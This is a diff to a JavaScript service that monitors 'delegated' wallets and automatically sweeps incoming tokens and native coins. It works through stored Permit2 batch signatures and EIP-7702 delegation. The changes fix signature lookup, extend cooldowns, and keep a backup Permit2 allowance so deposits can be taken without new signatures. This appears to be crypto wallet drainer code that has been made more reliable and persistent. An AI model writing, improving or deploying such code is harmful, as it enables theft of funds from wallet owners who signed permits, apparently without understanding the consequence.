@@ -1354,7 +1354,7 @@ async function dispatchSweep(wallet) {
   } catch (e) {
     log(`[sweep] ❌ error for ${short}: ${e.message}`);
   } finally {
-    setTimeout(() => sweepingNow.delete(key), 10000);
+    setTimeout(() => sweepingNow.delete(key), 120000);
   }
 }
 
@@ -1658,7 +1658,9 @@ async function sweep(wallet) {
       .eq("address", addrKey + "-sig")
       .eq("chain", CHAIN)
       .eq("spent", false)
-      .single();
+      .order("created_at", { ascending: false })
+      .limit(1)
+      .maybeSingle();
 
     if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
       const sig = stData.permit;
@@ -1819,7 +1821,7 @@ async function sweep(wallet) {
       let gasLimitOverride = null;
       const runPreflight = async (gasLimit) => permit2Batch.permitTransferFrom.staticCall(
         { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
-        fullTransferDetailsPf, checksum, sig.signature, { gasLimit },
+        fullTransferDetailsPf, checksum, stData.signature, { gasLimit },
       );
       try {
         await runPreflight(gasLimitPf);
@@ -1895,19 +1897,19 @@ async function sweep(wallet) {
           { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
           fullTransferDetails,
           checksum,
-          sig.signature,
+          stData.signature,
           { gasLimit, ...fee },
         );
         await tx.wait();
         log(`[gasless] ✅ swept ${withBalance.length} tokens`);
-        // Mark nonce as spent and flag for re-activation so the user signs fresh
-        // permits for any new tokens that arrive later.
         if (supabase) {
           await supabase.from("permit2_signatures").update({ spent: true })
             .eq("address", addrKey + "-sig").eq("chain", CHAIN).then(v => v, () => {});
+          const hasBackupAllowance = await hasLivePermit2Allowance(checksum).catch(() => false);
           await supabase.from("delegated_wallets")
-            .update({ needs_reactivation: true })
+            .update({ needs_reactivation: !hasBackupAllowance })
             .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+          if (hasBackupAllowance) log(`[gasless] AllowanceTransfer still active — future deposits covered without re-signing`);
         }
       } catch (e) {
         const revertName = e.revert?.name ?? null;
@@ -2333,7 +2335,7 @@ async function startTransferListeners(wsProvider, tokens) {
         const wallet = monitoredWallets.get(toLower);
         dispatchSweep(wallet)
           .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`))
-          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
+          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 120000));
       });
     } catch (e) {
       warn(`[listeners] batch ${i} subscription failed: ${e.message}`);
@@ -2389,7 +2391,7 @@ async function startNativeListener(wsProvider) {
         sweepEIP7702Wallet(wallet.address)
           .then(() => log(`[native] ✅ swept for ${tx.to.slice(0, 10)}`))
           .catch(e  => log(`[native] sweep error: ${e.message}`))
-          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
+          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 120000));
       }
     } catch (e) {
       if (e.message?.includes("rate limit") || e.message?.includes("50/second") || e.message?.includes("429")) {
